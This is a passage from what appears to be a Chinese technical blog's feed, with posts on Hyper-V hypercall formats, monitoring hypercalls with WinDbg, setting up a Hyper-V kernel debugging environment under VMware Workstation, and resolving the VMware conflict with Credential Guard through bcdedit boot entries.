寄存器可以用于传递输入参数。</p><p>如果 Hypervisor 支持 Extended Fast Hypercalls，那么还可以使用 XMM 寄存器来传递输入参数，最多支持 <code>112</code> 字节的数据：XMM0 ~ XMM5 共 <code>16 * 6 = 96</code> 字节，以及 <code>RDX</code> 和 <code>R8</code> 共 <code>16</code> 字节。</p><h3 id="1-5-Hypercall-Outputs"><a href="#1-5-Hypercall-Outputs" class="headerlink" title="1.5 Hypercall Outputs"></a>1.5 Hypercall Outputs</h3><p>Hypercall 的返回值通过 <code>RAX</code> 寄存器传递，对应的数据格式如下：</p><p><img src="/uploads/202005/hypercall-output-rax.png" alt="Hyper-v Hypercall RAX 参数格式"></p><p>对应的说明如下：</p><table><thead><tr><th>字段</th><th>宽度</th><th>含义</th></tr></thead><tbody><tr><td>Result</td><td>16 bits</td><td>HV_STATUS code</td></tr><tr><td>Rsvd</td><td>16 bits</td><td>保留字段</td></tr><tr><td>Reps completed</td><td>12 bits</td><td>已经成功执行的 Repeat 数</td></tr><tr><td>Rsvd</td><td>20 bits</td><td>保留字段</td></tr></tbody></table><p>注意这里的 <code>Reps completed</code> 是针对整个 Repeat Hypercall 而言的，即整个 Repeat Hypercall 已经成功执行的 Repeat 数。</p><p>同样，输出参数也支持使用 XMM 寄存器传递。</p><h2 id="0x02-Hypercall-调用"><a href="#0x02-Hypercall-调用" class="headerlink" title="0x02. Hypercall 调用"></a>0x02. Hypercall 调用</h2><p>Windows 内核模块导出了一个函数 <code>HvlInvokeHypercall</code> 可以用于发起 Hypercall，该函数是对 <code>vmcall</code> / <code>vmmcall</code> 指令的一个包装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; u poi(nt!HvcallCodeVa)</span><br><span class="line">fffff804`3f330000 0f01d9          vmmcall</span><br><span class="line">fffff804`3f330003 c3              ret</span><br><span class="line"></span><br><span class="line">1: kd&gt; u nt!HvcallInitiateHypercall</span><br><span class="line">nt!HvcallInitiateHypercall:</span><br><span class="line">fffff804`40945080 4883ec28        sub     rsp,28h</span><br><span class="line">fffff804`40945084 488b059de22200  mov     rax,qword ptr [nt!HvcallCodeVa]</span><br><span class="line">fffff804`4094508b e850f20000      call    nt!_guard_retpoline_indirect_rax</span><br><span class="line">fffff804`40945090 4883c428        add     rsp,28h</span><br><span class="line">fffff804`40945094 c3              ret</span><br></pre></td></tr></table></figure><p>注意这里函数的调式符号为 <code>HvcallInitiateHypercall</code> ，只不过是以 <code>HvlInvokeHypercall</code> 的名义导出的。</p><h2 id="0x03-Hypercall-监控"><a href="#0x03-Hypercall-监控" class="headerlink" title="0x03. Hypercall 监控"></a>0x03. Hypercall 监控</h2><p>在 WinDbg 中，可以通过对 <code>poi(nt!HvcallCodeVa)</code> 下硬件执行断点来监控 Hypercall 的调用，拆分后的代码如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ba e1 poi(nt!HvcallCodeVa)</span><br><span class="line"></span><br><span class="line">.printf &quot;           Hypercall: 0x%X\n&quot;, rcx &amp; 0xFFFF</span><br><span class="line">.printf &quot;                Fast: 0x%X\n&quot;, (rcx &gt;&gt; 16) &amp; 1</span><br><span class="line">.printf &quot;Variable header size: 0x%X\n&quot;, (rcx &gt;&gt; 17) &amp; 0x1FF</span><br><span class="line">.printf &quot;           Is Nested: 0x%X\n&quot;, (rcx &gt;&gt; 26) &amp; 1</span><br><span class="line">.printf &quot;           Rep Count: 0x%X\n&quot;, (rcx &gt;&gt; 32) &amp; 0xFFF</span><br><span class="line">.printf &quot;     Rep Start Index: 0x%X\n&quot;, (rcx &gt;&gt; 48) &amp; 0xFFF</span><br><span class="line">k</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p>WinDbg 仅支持单行命令，所以实际测试时需要把断点之后的命令写成一行、使用双引号括起来并且原有命令中的特殊字符需要进行转义处理。</p><p>使用上面的方法进行监控，WinDbg 会输出大量的日志，这其中不乏一些奇怪的日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">           Hypercall: 0xB</span><br><span class="line">                Fast: 0x0</span><br><span class="line">Variable header size: 0x0</span><br><span class="line">           Is Nested: 0x0</span><br><span class="line">           Rep Count: 0x0</span><br><span class="line">     Rep Start Index: 0x100</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 fffffd89`ba061828 fffff800`37c89f7c 0xfffff800`35e10000</span><br><span class="line">01 fffffd89`ba061830 fffff800`384b9752 nt!HvlSendSyntheticClusterIpi+0x7c</span><br><span class="line">02 fffffd89`ba061860 fffff800`37abaecb hal!HalRequestIpi+0x532</span><br><span class="line">03 fffffd89`ba061b00 fffff800`37bc5e84 nt!PoIdle+0x45b</span><br><span class="line">04 fffffd89`ba061c60 00000000`00000000 nt!KiIdleLoop+0x44</span><br></pre></td></tr></table></figure><p>比如，按照微软官方文档的理解，这里 <code>Rep Count</code> 为 <code>0</code> ，所以编号为 <code>0xB</code> 的 Hypercall 应该是一个 Simple Hypercall，而 Simple Hypercall 的 <code>Rep Start Index</code> 也应该是 <code>0</code> ，但这里却为 <code>0x100</code> 。</p><p>当然，这种方法最主要的问题是没有对 Hypercall 进行过滤，这就会导致 WinDbg 需要频繁地处理断点，既耗费资源，操作也不是很方便。那么在 WinDbg 的条件断点中再加一个过滤条件可不可以呢？当然是可以的！但是在 WinDbg 进行过滤的时候，其实断点已经命中并且由 WinDbg 接管了，所以反应速度还是很慢。</p><p>Jaanus Kääp 通过在 WinDbg 中对内核模块进行 Patch，即对地址 <code>poi(nt!HvcallCodeVa)</code> 进行 HOOK，直接过滤掉不感兴趣的 Hypercall，这样 WinDbg 的反应速度就会快很多。具体的操作方法如下：</p><ol><li>写一段汇编指令过滤掉 Fast 类型的 Hypercall</li><li>将汇编指令编译成机器码</li><li>在内核模块的 <code>.text</code> 末尾找到一块可执行的空白区间用于存放机器码</li><li>修复 HOOK 的跳转<ul><li>把 <code>nt!HvcallCodeVa</code> 处的值修改为上述机器码的起始地址</li><li>过滤代码执行完毕后跳转回 <code>poi(nt!HvcallCodeVa)</code> 执行代码</li></ul></li></ol><p>过滤代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">        test    rcx, 0x10000</span><br><span class="line">        jnz     skip</span><br><span class="line">        int     3</span><br><span class="line">skip:</span><br><span class="line">        mov     rax, 0xfffff8014dfc0000</span><br><span class="line">        jmp     rax</span><br></pre></td></tr></table></figure><p>这里如果遇到非 Fast Hypercall 则通过 <code>int 3</code> 中断，会自动激活 WinDbg；也可以在这里下条件断点进行自动监控。</p><h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol><li>Jaanus Kääp 博客 <a href="https://foxhex0ne.blogspot.com/2020/05/hyper-v-0x1-hypercalls-part-1.html" target="_blank" rel="noopener">Hyper-V #0x1 - Hypercalls part 1</a></li><li>微软官方文档 <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/tlfs" target="_blank" rel="noopener">Hypervisor Top-Level Functional Specification</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hyper-V Hypercall 相关基础知识介绍。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="https://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="https://programlife.net/tags/Hyper-V/"/>
    
      <category term="Hypercall" scheme="https://programlife.net/tags/Hypercall/"/>
    
  </entry>
  
  <entry>
    <title>Hyper-V 调试环境搭建</title>
    <link href="https://programlife.net/2020/05/16/hyper-v-debugging/"/>
    <id>https://programlife.net/2020/05/16/hyper-v-debugging/</id>
    <published>2020-05-16T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>本文将详细介绍使用 AMD CPU 的电脑如何利用 VMware Workstation 搭建 Hyper-V 的调试环境。</p><a id="more"></a><p>上一篇文章《<a href="https://programlife.net/2020/05/11/hyper-v-on-windows-10-notes/">Hyper-V on Windows 10 Notes</a>》提到了 Hyper-V 暂时不支持 AMD CPU 的嵌套虚拟化，所以就无法使用文章《<a href="https://msrc-blog.microsoft.com/2018/12/10/first-steps-in-hyper-v-research/" target="_blank" rel="noopener">First Steps in Hyper-V Research</a>》中介绍的 Hyper-V 嵌套虚拟化来搭建 Hyper-V 的调试环境，本文参考文章《<a href="https://foxhex0ne.blogspot.com/2020/05/hyper-v-0x0-research-setup.html" target="_blank" rel="noopener">Hyper-V #0x0 - Research setup</a>》中介绍的方法利用 VMware Workstation 来搭建 Hyper-V 的调试环境。</p><h2 id="0x01-物理机设置"><a href="#0x01-物理机设置" class="headerlink" title="0x01. 物理机设置"></a>0x01. 物理机设置</h2><p>物理机不需要安装 Hyper-V 组件，否则 VMware Workstation 将无法运行；如果物理机安装了 Hyper-V，可以参考文章《<a href="https://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/">VMware Workstation Incompatible with Device/Credential Guard</a>》临时禁用 Hyper-V。</p><h2 id="0x02-虚拟机设置"><a href="#0x02-虚拟机设置" class="headerlink" title="0x02. 虚拟机设置"></a>0x02. 虚拟机设置</h2><p>物理机安装好 VMware Workstation 之后，可以新建一个虚拟机并安装好最新的 64 位 Windows 10 操作系统。</p><h3 id="2-1-虚拟机-CPU-设置"><a href="#2-1-虚拟机-CPU-设置" class="headerlink" title="2.1 虚拟机 CPU 设置"></a>2.1 虚拟机 CPU 设置</h3><p>这里需要在 VMware Workstation 中为虚拟机的 CPU 开启虚拟化引擎：</p><ul><li>虚拟化 Intel VT-x/EPT 或 AMD-V/RVI(V)</li><li>虚拟化 CPU 性能计数器(U)</li></ul><p><img src="/uploads/202005/vmware-hyperv-cpu-settings.png" alt="CPU 虚拟化引擎设置"></p><p>同时，需要为虚拟机增加一个串口用于 Windows 内核调试（虚拟机默认有一个打印机，需要先把打印机删掉）：</p><ul><li>使用命名管道 <code>\\.\pipe\com_1</code> </li><li>该端是服务器</li><li>另一端是虚拟机</li></ul><p><img src="/uploads/202005/vmware-kernel-debug-serial-port.png" alt="虚拟机串口设置"></p><h3 id="2-2-虚拟机-Hyper-V-设置"><a href="#2-2-虚拟机-Hyper-V-设置" class="headerlink" title="2.2 虚拟机 Hyper-V 设置"></a>2.2 虚拟机 Hyper-V 设置</h3><p>这里需要在安装好的虚拟机中安装并启用 Hyper-V 组件，同时通过 <code>bcdedit</code> 设置相关的调试选项。</p><ul><li>内核调试设置（通过串口进行调试）</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /dbgsettings serial debugport:<span class="number">1</span> baudrate:<span class="number">115200</span></span><br><span class="line">bcdedit /debug on</span><br></pre></td></tr></table></figure><ul><li>Hyper-V 调试设置（通过网络进行调试）</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /hypervisorsettings NET HOSTIP:<span class="number">192.168</span>.<span class="number">6.1</span> PORT:<span class="number">50000</span></span><br><span class="line">bcdedit /set hypervisordebug on</span><br><span class="line">bcdedit /set hypervisorlaunchtype auto</span><br></pre></td></tr></table></figure><p>注意这里的 IP 地址是物理机中网卡 <code>VMware Network Adapter VMnet8</code> 的 IP 地址，端口设置为 <code>50000</code> 。这条命令执行完毕之后产生的一个 Key 需要记下来，后面 WinDbg 设置将会用到。</p><p><img src="/uploads/202005/hyperv-bcdedit-debug-settings.png" alt="虚拟机 Hyper-V 设置"></p><h2 id="0x03-WinDbg-设置"><a href="#0x03-WinDbg-设置" class="headerlink" title="0x03. WinDbg 设置"></a>0x03. WinDbg 设置</h2><p>复制两个 64 位 WinDbg 的快捷方式，其中一个附加如下参数用于调试 Windows 内核：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-k com:port=\\.\pipe\com_1,baud=115200,pipe,reconnect</span><br></pre></td></tr></table></figure><p>另一个附加如下参数用于调试 Hyper-V：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-k net:port=50000,key=前面生成的Key字符串</span><br></pre></td></tr></table></figure><h2 id="0x04-Hyper-V-调试"><a href="#0x04-Hyper-V-调试" class="headerlink" title="0x04. Hyper-V 调试"></a>0x04. Hyper-V 调试</h2><p>一切准备就绪之后，先打开两个 WinDbg，然后开启虚拟机，就可以开始调试了。</p><p>在调试 Hyper-V 的 WinDbg 中，可以查看 <code>hv</code> 模块的相关信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; lmvm hv</span><br><span class="line">Browse full module list</span><br><span class="line">start             end                 module name</span><br><span class="line">fffffb6a`57000000 fffffb6a`58800000   hv         (no symbols)</span><br><span class="line">    Loaded symbol image file: hvax64.exe</span><br><span class="line">    Image path: hvax64.exe</span><br><span class="line">    Image name: hvax64.exe</span><br><span class="line">    Browse all global symbols  functions  data</span><br><span class="line">    Image was built with /Brepro flag.</span><br><span class="line">    Timestamp:        DBBF3B47</span><br><span class="line">    CheckSum:         00110BD8</span><br><span class="line">    ImageSize:        01800000</span><br><span class="line">    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4</span><br><span class="line">    Information from resource tables:</span><br><span class="line"></span><br><span class="line">0: kd&gt; ?hv</span><br><span class="line">Evaluate expression: -5040831987712 = fffffb6a`57000000</span><br></pre></td></tr></table></figure><p>因为这里物理机使用的是 AMD 的 CPU，所以 <code>hv</code> 模块实际上是 <code>hvax64.exe</code> ；如果是 Intel 的 CPU，那么会是 <code>hvix64.exe</code> 。</p><p>在调试 Windows 内核的 WinDbg 中，可以查看 <code>hypercall</code> 对应的指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; u poi(nt!HvcallCodeVa)</span><br><span class="line">fffff804`4cbe0000 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0003 c3              ret</span><br><span class="line">fffff804`4cbe0004 8bc8            mov     ecx,eax</span><br><span class="line">fffff804`4cbe0006 b811000000      mov     eax,11h</span><br><span class="line">fffff804`4cbe000b 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe000e c3              ret</span><br><span class="line">fffff804`4cbe000f 488bc1          mov     rax,rcx</span><br><span class="line">fffff804`4cbe0012 48c7c111000000  mov     rcx,11h</span><br><span class="line">fffff804`4cbe0019 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe001c c3              ret</span><br><span class="line">fffff804`4cbe001d 8bc8            mov     ecx,eax</span><br><span class="line">fffff804`4cbe001f b812000000      mov     eax,12h</span><br><span class="line">fffff804`4cbe0024 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0027 c3              ret</span><br><span class="line">fffff804`4cbe0028 488bc1          mov     rax,rcx</span><br><span class="line">fffff804`4cbe002b 48c7c112000000  mov     rcx,12h</span><br><span class="line">fffff804`4cbe0032 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0035 c3              ret</span><br></pre></td></tr></table></figure><p>因为这里物理机使用的是 AMD 的 CPU，所以 <code>hypercall</code> 对应的指令为 <code>vmmcall</code> ；如果是 Intel 的 CPU，那么 <code>hypercall</code> 对应的指令为 <code>vmcall</code> 。</p><p>对 <code>vmmcall</code> 所在的位置下断点，需要使用硬件执行断点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; ba e1 poi(nt!HvcallCodeVa)</span><br><span class="line">3: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">fffff804`4cbe0000 0f01d9          vmmcall</span><br><span class="line"></span><br><span class="line">1: kd&gt; k</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 ffffbe0b`d64532c8 fffff804`4d9cc124 0xfffff804`4cbe0000</span><br><span class="line">01 ffffbe0b`d64532d0 fffff804`4da8e91c nt!HvcallpExtendedFastHypercall+0x54</span><br><span class="line">02 ffffbe0b`d64532e0 fffff804`4da8eb10 nt!HvlpFastFlushListTb+0xac</span><br><span class="line">03 ffffbe0b`d64533a0 fffff804`4da8e5f3 nt!HvlpFlushRangeListTb+0x88</span><br><span class="line">04 ffffbe0b`d6453400 fffff804`4da52642 nt!HvlFlushRangeListTb+0x63</span><br><span class="line">05 ffffbe0b`d6453450 fffff804`4d8f3e71 nt!MiFlushTbList+0x167fe2</span><br><span class="line">06 ffffbe0b`d64535a0 fffff804`4d8f5305 nt!MiCopyOnWrite+0x761</span><br><span class="line">07 ffffbe0b`d6453840 fffff804`4d8c986f nt!MiValidFault+0x295</span><br><span class="line">08 ffffbe0b`d64538b0 fffff804`4d8c8fae nt!MiUserFault+0x3cf</span><br><span class="line">09 ffffbe0b`d6453960 fffff804`4d9d041e nt!MmAccessFault+0x14e</span><br><span class="line">0a ffffbe0b`d6453b00 00007ff8`107805d3 nt!KiPageFault+0x35e</span><br><span class="line">0b 0000002e`3b4fb030 00000003`22e0813e 0x00007ff8`107805d3</span><br><span class="line">0c 0000002e`3b4fb038 000001b8`adbe82f0 0x00000003`22e0813e</span><br><span class="line">0d 0000002e`3b4fb040 00000000`00000000 0x000001b8`adbe82f0</span><br></pre></td></tr></table></figure><p>和系统调用一样，不同的 <code>hypercall</code> 对应不同的编号，编号可以用于定位对应的 Handler 函数。在地址 <code>hv+0xC00000</code> 处，每一个 <code>hypercall</code> 有一个 <code>0x18</code> 字节的结构体，其中结构体最前面的 <code>8</code> 字节便是对应的 Handler 函数的起始地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">4: kd&gt; dq hv+0xC00000</span><br><span class="line">fffffb6a`57c00000  fffffb6a`572321e0 00000000`00000000</span><br><span class="line">fffffb6a`57c00010  00000041`00000000 fffffb6a`5729ae90</span><br><span class="line">fffffb6a`57c00020  00000008`00000001 00000044`00000000</span><br><span class="line">fffffb6a`57c00030  fffffb6a`5722dcc0 00000018`00000002</span><br><span class="line">fffffb6a`57c00040  00000044`00000000 fffffb6a`57215e40</span><br><span class="line">fffffb6a`57c00050  00080018`00010003 00000044`00000000</span><br><span class="line">fffffb6a`57c00060  fffffb6a`5729b230 00000008`00000004</span><br><span class="line">fffffb6a`57c00070  0000003f`00000020 fffffb6a`57244200</span><br><span class="line"></span><br><span class="line">4: kd&gt; u fffffb6a`572321e0</span><br><span class="line">hv+0x2321e0:</span><br><span class="line">fffffb6a`572321e0 b802000000      mov     eax,2</span><br><span class="line">fffffb6a`572321e5 c3              ret</span><br><span class="line">fffffb6a`572321e6 cc              int     3</span><br></pre></td></tr></table></figure><h2 id="0x05-调试符号"><a href="#0x05-调试符号" class="headerlink" title="0x05. 调试符号"></a>0x05. 调试符号</h2><p>微软已经逐步开放了 Hyper-V 相关组件的调试符号，但是 <code>hv</code> 模块（即 <code>hvax64.exe / hvix64.exe</code> ）的调试符号暂时不对吃瓜群众开放。</p><p>微软还为 WinDbg 开发了一个调试 Hyper-V 的插件 <code>hvexts.dll</code> ，但目前也没有对外开放。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将详细介绍使用 AMD CPU 的电脑如何利用 VMware Workstation 搭建 Hyper-V 的调试环境。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="https://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="https://programlife.net/tags/Hyper-V/"/>
    
      <category term="VMware Workstation" scheme="https://programlife.net/tags/VMware-Workstation/"/>
    
  </entry>
  
  <entry>
    <title>Hyper-V on Windows 10 Notes</title>
    <link href="https://programlife.net/2020/05/13/hyper-v-on-windows-10-notes/"/>
    <id>https://programlife.net/2020/05/13/hyper-v-on-windows-10-notes/</id>
    <published>2020-05-13T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>周末花了点时间看了微软对 Hyper-V 的介绍文档《<a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/" target="_blank" rel="noopener">Hyper-V on Windows 10</a>》，顺便记点笔记。</p><a id="more"></a><ul><li><p><strong>About Hyper-V on Windows</strong></p><ul><li><em>Introduction to Hyper-V</em><ul><li>在 Windows 宿主机中启用 Hyper-V 之后，宿主机也会运行在 Hyper-V 之上（就像 Hyper-V 中创建的虚拟机一样），因此宿主机中某些对实时性要求较高的应用程序的运行可能会受到一定的影响；但与虚拟机不同的是，宿主机可以直接访问所有硬件资源。</li></ul></li></ul></li></ul><p><img src="/uploads/202005/hyperv-architecture.png" alt="Hyper-V 架构图"></p><ul><li><p><strong>Get started with Hyper-V</strong></p><ul><li><p><em>Install Hyper-V</em></p><ul><li>安装 Hyper-V 有多种方式，在 <strong>启用或关闭 Windows 功能</strong> 中安装是一种非常简单的方式。</li></ul></li><li><p><em>Create a Virtual Machine</em></p><ul><li><p>在创建虚拟机时会涉及到 Generation 的概念，微软建议创建二代虚拟机；一代虚拟机支持绝大多数的操作系统，二代虚拟机支持 Secure Boot（仅支持安装 64 位操作系统）；虚拟机一旦创建，Generation 便不可更改。</p></li><li><p>Secure Boot 会检查 Bootloader 的签名主体在 UEFI 数据库中是否存在，非法的 Bootloader 不会被运行。</p></li><li><p>如果要调试虚拟机操作系统的内核，那么需要先禁用 Secure Boot，然后通过 PowerShell 命令为虚拟机添加一个串口：</p><ul><li><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-VMComPort -VMName TestVM <span class="number">1</span> \\.\pipe\TestPipe</span><br></pre></td></tr></table></figure></li></ul></li><li><p>虚拟机默认会开启 <strong>使用自动检查点</strong>，即自动创建快照功能，建议关闭该选项。</p></li></ul></li><li><p><em>Hyper-V and PowerShell</em></p><ul><li>使用 PowerShell 可以很方便的和虚拟机进行各种交互，在 Fuzz 的时候应该会有用。</li></ul></li><li><p><em>Share devices with VMs</em></p><ul><li>虚拟机默认使用 <strong>增强会话</strong> 模式，这样我们可以通过 RDP 来访问虚拟机，体验和使用远程桌面是一样的；在该模式下，虚拟机和宿主机之间默认共享剪贴板并支持文件拖放，通过设置还可以共享音频设备、驱动器、打印机等；实际测试表明该模式下的画面清晰度更高，UI 不会有模糊的感觉。</li></ul></li><li><p><em>Connect with PowerShell Direct</em></p><ul><li>支持在宿主机中针对虚拟机执行 PowerShell 命令。</li></ul></li></ul></li><li><p><strong>Nested Virtualization</strong></p><ul><li><p>Hyper-V 支持嵌套虚拟化（目前仅支持 Intel CPU），可使用 PowerShell 命令为虚拟机启用该特性：</p><ul><li><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-VMProcessor -VMName &lt;VMName&gt; -ExposeVirtualizationExtensions <span class="literal">$true</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>Hyper-V 可能在未来的版本中增加对 AMD CPU 嵌套虚拟化的支持（参考 <a href="https://github.com/MicrosoftDocs/Virtualization-Documentation/issues/1276" target="_blank" rel="noopener">AMD nested virtualization?</a>）。</p></li></ul></li></ul><p>未启用嵌套虚拟化时的 Hyper-V 架构图如下：</p><p><img src="/uploads/202005/hyperv-no-nesting.png" alt="未启用嵌套虚拟化的 Hyper-V 架构图"></p><p>启用了嵌套虚拟化之后的 Hyper-V 架构图如下：</p><p><img src="/uploads/202005/hyperv-nesting.png" alt="启用了嵌套虚拟化的 Hyper-V 架构图"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;周末花了点时间看了微软对 Hyper-V 的介绍文档《&lt;a href=&quot;https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hyper-V on Windows 10&lt;/a&gt;》，顺便记点笔记。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="https://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="https://programlife.net/tags/Hyper-V/"/>
    
  </entry>
  
  <entry>
    <title>VMware Workstation Incompatible with Device/Credential Guard</title>
    <link href="https://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/"/>
    <id>https://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/</id>
    <published>2020-05-10T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>在 Windows 中启用 Hyper-V 之后，VMware Workstation 就不能用了，会提示“VMware Workstation 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VMware Workstation”，然而禁用 Device/Credential Guard 并不能解决问题。</p><a id="more"></a><p><img src="/uploads/202005/vmware-workstation-incompatible-with-device-credential-guard.png" alt="VMware Workstation and Device/Credential Guard are not compatible"></p><p>启用 Hyper-V 之后，原来的宿主机操作系统实际上也变成了一台虚拟机，即宿主机操作系统是运行在 Hypervisor 之上的，此时再运行 VMware Workstation <strong><em>可能会产生嵌套虚拟化</em></strong>（此为猜测），而 Hyper-V 的虚拟机默认是没有开启嵌套虚拟化支持的。</p><p>一个可行的解决方法是通过 <code>bcdedit</code> 设置两套启动方案，一套启用 Hyper-V，另一套则禁用 Hyper-V（设置 <code>HypervisorLaunchType</code> 为 <code>OFF</code>）以便运行 VMware Workstation。</p><p><img src="/uploads/202005/bcdedit-hypervisor-launchtype.png" alt="通过 bcdedit 参数 HypervisorLaunchType 禁用 Hyper-V"></p><p>相关命令文本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> &#123;current&#125; description <span class="string">"Windows 10 Hyper-V"</span></span><br><span class="line">bcdedit /copy &#123;current&#125; /d <span class="string">"Winows 10"</span></span><br><span class="line"><span class="comment">// 已将该项成功复制到 &#123;new_guid&#125;</span></span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;new_guid&#125; HypervisorLaunchType OFF</span><br><span class="line">bcdedit /displayorder &#123;current&#125; &#123;new_guid&#125;</span><br><span class="line">bcdedit /timeout <span class="number">10</span></span><br></pre></td></tr></table></figure><p>这里默认进入启用了 Hyper-V 的启动项，等待时间设置为 10 秒钟。</p><p><strong>2020/05/30 更新</strong></p><p>VMware Workstation 15.5 已经支持运行在 Hyper-V 模式下了，要求 Windows 至少是 Windows 10 20H1 build 19041.264 及更新版本，参考 <a href="https://blogs.vmware.com/workstation/2020/05/vmware-workstation-now-supports-hyper-v-mode.html" target="_blank" rel="noopener">VMware Workstation 15.5 Now Supports Host Hyper-V Mode</a> ：</p><blockquote><p><strong>How does VMware Workstation 